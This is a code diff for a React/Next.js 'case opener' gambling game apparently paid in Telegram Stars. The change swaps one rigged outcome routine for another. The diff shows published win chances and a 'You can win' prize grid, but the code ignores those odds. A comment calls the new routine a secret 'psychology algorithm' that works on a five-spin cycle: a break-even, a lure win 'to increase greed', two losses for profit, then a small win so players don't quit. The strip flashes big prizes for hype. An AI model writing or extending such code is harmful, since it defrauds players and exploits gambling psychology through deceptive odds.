@@ -3,30 +3,33 @@
 import { useState, useRef, useEffect } from "react";
 import Link from "next/link";
 
-// 1. ONE MEGA PRIZE POOL (Real Telegram Star Values)
-// Player sees ALL of these to get greedy, regardless of bet amount.
+// 1. MEGA PRIZE POOL (Exact emojis from your Screenshot)
 const prizePool = [
-  { id: 1, name: "Teddy", icon: "🧸", chance: "20.5%", value: 15, rarity: "common" },
-  { id: 2, name: "Gift", icon: "🎁", chance: "15.0%", value: 25, rarity: "common" },
-  { id: 3, name: "Cake", icon: "🎂", chance: "12.5%", value: 50, rarity: "common" },
-  { id: 4, name: "Flowers", icon: "💐", chance: "12.5%", value: 50, rarity: "common" },
-  { id: 5, name: "Rocket", icon: "🚀", chance: "10.0%", value: 50, rarity: "common" },
-  { id: 6, name: "Trophy", icon: "🏆", chance: "5.0%", value: 100, rarity: "epic" },
-  { id: 7, name: "Ring", icon: "💍", chance: "5.0%", value: 100, rarity: "epic" },
-  { id: 8, name: "Crystals", icon: "✨", chance: "0.5%", value: 250, rarity: "legendary" }
+  { id: 1, name: "Crystals", icon: "✨", chance: "0.45%", value: 250, rarity: "legendary" },
+  { id: 2, name: "Trophy", icon: "🏆", chance: "1.31%", value: 100, rarity: "epic" },
+  { id: 3, name: "Diamond", icon: "💎", chance: "1.31%", value: 100, rarity: "epic" },
+  { id: 4, name: "Ring", icon: "💍", chance: "1.31%", value: 100, rarity: "epic" },
+  { id: 5, name: "Cake", icon: "🎂", chance: "1.44%", value: 50, rarity: "common" },
+  { id: 6, name: "Flowers", icon: "💐", chance: "1.44%", value: 50, rarity: "common" },
+  { id: 7, name: "Rocket", icon: "🚀", chance: "1.44%", value: 50, rarity: "common" },
+  { id: 8, name: "Champagne", icon: "🍾", chance: "1.44%", value: 50, rarity: "common" },
+  { id: 9, name: "Rose", icon: "🌹", chance: "34.90%", value: 25, rarity: "common" },
+  { id: 10, name: "Gift", icon: "🎁", chance: "34.90%", value: 25, rarity: "common" },
+  { id: 11, name: "Heart", icon: "💝", chance: "10.04%", value: 15, rarity: "common" },
+  { id: 12, name: "Teddy", icon: "🧸", chance: "10.04%", value: 15, rarity: "common" }
 ];
 
-const bonusItem = { id: 99, name: "Bonus", icon: "💼", chance: "0.1%", value: 500, rarity: "legendary" };
+const bonusItem = { id: 99, name: "Bonus", icon: "💼", chance: "0.10%", value: 500, rarity: "legendary" };
 const demoGift = { id: 100, name: "Demo Gift", icon: "🎁", chance: "100%", value: 0, rarity: "common" };
 
-type BetLevel = 25 | 50 | 100 | 250;
+type BetLevel = 25 | 50;
 
 export default function CaseOpener() {
-  const [balance, setBalance] = useState(1000); // Demo start balance
+  const [balance, setBalance] = useState(1000); 
   const [betAmount, setBetAmount] = useState<BetLevel>(25);
   const [isDemo, setIsDemo] = useState(true);
   
-  // Animation States
+  // Animation & Game States
   const [isRolling, setIsRolling] = useState(false);
   const [stripItems, setStripItems] = useState<any[]>([]);
   const [sliderTranslate, setSliderTranslate] = useState(0);
@@ -35,6 +38,9 @@ export default function CaseOpener() {
   const [winningItem, setWinningItem] = useState<any | null>(null);
 
   const containerRef = useRef<HTMLDivElement>(null);
+  
+  // The Psychology Tracker (To manage wins and losses secretly)
+  const spinCount = useRef(0);
   
   // Set initial strip on load
   useEffect(() => {
@@ -59,21 +65,41 @@ export default function CaseOpener() {
     setTransitionStyle("none");
     setSliderTranslate(0); 
 
-    // 🌚 THE SECRET ALGORITHM (Always keeping the house in profit)
+    // THE PSYCHOLOGY ALGORITHM 🧠 (Jitao, Harao, Jitao)
     let riggedWinner;
+    
     if (isDemo) {
-      riggedWinner = demoGift;
+      riggedWinner = demoGift; // Demo me hamesha test gift do
     } else {
-      // Force user to win an item that is LOWER or EQUAL to their bet
-      const possibleRiggedWins = prizePool.filter(p => p.value <= betAmount);
-      // Give them the lowest possible value most of the time to maximize profit
-      riggedWinner = possibleRiggedWins[0]; // Usually the Teddy (15) or Gift (25)
+      spinCount.current += 1;
+      const cycle = spinCount.current % 5; // Loop of 5 spins
+
+      if (cycle === 1) {
+        // SPIN 1: BREAK EVEN (Jitna lagaya utna hi wapas, no loss no gain)
+        const evens = prizePool.filter(p => p.value === betAmount);
+        riggedWinner = evens[Math.floor(Math.random() * evens.length)] || prizePool[10];
+      } 
+      else if (cycle === 2) {
+        // SPIN 2: BIG WIN (Lalach badhao! Bet se zyada jitao)
+        const wins = prizePool.filter(p => p.value > betAmount && p.value <= betAmount * 4);
+        riggedWinner = wins[Math.floor(Math.random() * wins.length)] || prizePool[5];
+      } 
+      else if (cycle === 3 || cycle === 4) {
+        // SPIN 3 & 4: LOSE (Ab apna profit nikaalo, bet se kam value do like Teddy or Heart)
+        const losses = prizePool.filter(p => p.value < betAmount);
+        riggedWinner = losses[Math.floor(Math.random() * losses.length)] || prizePool[11];
+      } 
+      else {
+        // SPIN 5: SMALL WIN / BREAK EVEN (Taaki wo game chhod ke na bhage)
+        const evens = prizePool.filter(p => p.value >= betAmount && p.value <= betAmount * 2);
+        riggedWinner = evens[Math.floor(Math.random() * evens.length)] || prizePool[4];
+      }
     }
 
     const targetIndex = 65; 
     const generateStrip = Array.from({ length: 80 }).map((_, i) => {
       if (i === targetIndex) return riggedWinner;
-      // Show big items (100, 250) in the strip to build hype!
+      // Beech-beech me bade items dikhao taaki visual hype bani rahe
       return Math.random() > 0.95 ? bonusItem : prizePool[Math.floor(Math.random() * prizePool.length)];
     });
 
@@ -83,10 +109,14 @@ export default function CaseOpener() {
       if (!containerRef.current) return;
       
       const containerWidth = containerRef.current.offsetWidth;
-      const itemWidth = 128; // w-28 (112px) + gap-4 (16px)
+      const itemWidth = 128; // w-28 is 112px + gap-4 is 16px = 128px
       
-      const exactScroll = (targetIndex * itemWidth) - (containerWidth / 2) + (itemWidth / 2);
-      const randomOffset = Math.floor(Math.random() * 60) - 30; 
+      // Exact pixel math for center alignment
+      const centerOfTarget = (targetIndex * itemWidth) + (itemWidth / 2);
+      const exactScroll = centerOfTarget - (containerWidth / 2);
+      
+      // Slight random shift inside the card boundary for realism
+      const randomOffset = Math.floor(Math.random() * 40) - 20; 
       
       setTransitionStyle("transform 6s cubic-bezier(0.1, 0.9, 0.2, 1)");
       setSliderTranslate(-(exactScroll + randomOffset));
@@ -125,19 +155,19 @@ export default function CaseOpener() {
         </div>
       </div>
 
-      {/* Bet Selectors */}
-      <div className="w-full max-w-md flex justify-between px-4 mt-6">
-        {([25, 50, 100, 250] as BetLevel[]).map((amt) => (
+      {/* Bet Selectors (Only 25 and 50 as requested) */}
+      <div className="w-full max-w-md flex gap-4 px-4 mt-6">
+        {([25, 50] as BetLevel[]).map((amt) => (
           <button 
             key={amt}
             onClick={() => {
               if(!isRolling) {
                 setBetAmount(amt);
-                setWinningItem(null); // Clear previous win text
+                setWinningItem(null); 
               }
             }}
             disabled={isRolling}
-            className={`flex items-center gap-1 px-4 py-3 rounded-xl font-bold transition-all border ${
+            className={`flex-1 flex justify-center items-center gap-1 px-4 py-3 rounded-xl font-bold transition-all border ${
               betAmount === amt 
               ? 'bg-[#1a233a] border-blue-500 shadow-[0_0_15px_rgba(59,130,246,0.3)] text-white' 
               : 'bg-[#15151e] border-gray-800 text-gray-400'
@@ -149,7 +179,7 @@ export default function CaseOpener() {
       </div>
 
       {/* CS:GO Style Rolling Slider */}
-      <div className="w-full max-w-md mt-6 relative h-44 flex items-center bg-[#0d0d14] border-y border-gray-800" ref={containerRef}>
+      <div className="w-full max-w-md mt-6 relative h-44 flex items-center bg-[#0d0d14] border-y border-gray-800 overflow-hidden" ref={containerRef}>
         <div className="absolute left-1/2 -translate-x-1/2 w-16 h-full bg-blue-500/10 blur-xl z-0"></div>
         <div className="absolute left-1/2 -translate-x-1/2 top-0 bottom-0 w-1 bg-blue-500 z-20 shadow-[0_0_15px_rgba(59,130,246,1)]"></div>
 
@@ -159,7 +189,8 @@ export default function CaseOpener() {
             transform: `translateX(${sliderTranslate}px)`,
             transition: transitionStyle,
             width: "max-content",
-            paddingLeft: "50vw",
+            // Keep starting point clean
+            paddingLeft: "50%", 
           }}
         >
           {stripItems.map((item, idx) => (
@@ -167,7 +198,7 @@ export default function CaseOpener() {
               item.name === "Bonus" ? 'border-yellow-500 shadow-[inset_0_0_20px_rgba(234,179,8,0.2)]' : 'border-gray-800'
             }`}>
               
-              <span className="text-6xl drop-shadow-2xl z-10">{item.icon}</span>
+              <span className="text-6xl drop-shadow-2xl z-10 select-none">{item.icon}</span>
 
               {item.name === "Bonus" && <span className="text-yellow-500 font-bold text-sm absolute bottom-2 tracking-widest z-10">BONUS</span>}
               
@@ -191,7 +222,7 @@ export default function CaseOpener() {
         )}
       </div>
 
-      {/* Controls Area */}
+      {/* Controls Area (Play & Demo Switch) */}
       <div className="w-full max-w-md px-4 mt-2 flex gap-4 items-center">
         <button 
           onClick={startRoll}
@@ -212,17 +243,19 @@ export default function CaseOpener() {
         </div>
       </div>
 
-      {/* Grid of Winning Possibilities (Matches Screenshot Exactly) */}
+      {/* Grid of Winning Possibilities (Exact Match of Screenshot) */}
       <div className="w-full max-w-md px-4 mt-10">
         <p className="text-center text-gray-400 font-medium mb-4">You can win...</p>
         <div className="grid grid-cols-4 gap-3">
           {prizePool.map((prize) => (
             <div key={prize.id} className="bg-[#15151e] border border-gray-800 rounded-2xl p-2 flex flex-col items-center relative overflow-hidden">
+              
+              {/* Optional tag for rare items */}
               {prize.rarity === 'legendary' && (
-                <div className="absolute top-0 right-0 bg-blue-500 text-white text-[8px] font-bold px-4 py-1 rotate-45 translate-x-3 translate-y-1 shadow-md uppercase tracking-wider">Crystals</div>
+                <div className="absolute top-0 right-0 bg-blue-500 text-white text-[7px] font-bold px-4 py-1 rotate-45 translate-x-3 translate-y-1 shadow-md uppercase tracking-wider">Crystals</div>
               )}
               
-              <span className="text-4xl drop-shadow-lg mt-2">{prize.icon}</span>
+              <span className="text-4xl drop-shadow-lg mt-2 select-none">{prize.icon}</span>
 
               <span className="text-gray-500 text-[9px] mt-2 font-bold text-center w-full truncate">✨ {prize.chance}</span>
               <div className="bg-[#0a0a0f] border border-gray-700 w-full text-center mt-1 py-1 rounded flex justify-center items-center gap-1">
@@ -244,7 +277,7 @@ export default function CaseOpener() {
             
             <h2 className="text-white text-2xl font-bold mt-2">Demo gift</h2>
             
-            <span className="text-8xl drop-shadow-[0_0_30px_rgba(255,0,0,0.3)] animate-pulse my-4">{demoGift.icon}</span>
+            <span className="text-8xl drop-shadow-[0_0_30px_rgba(255,0,0,0.3)] animate-pulse my-4 select-none">{demoGift.icon}</span>
 
             <p className="text-gray-400 text-center font-medium mb-8">Demo mode is for testing chances.</p>
             
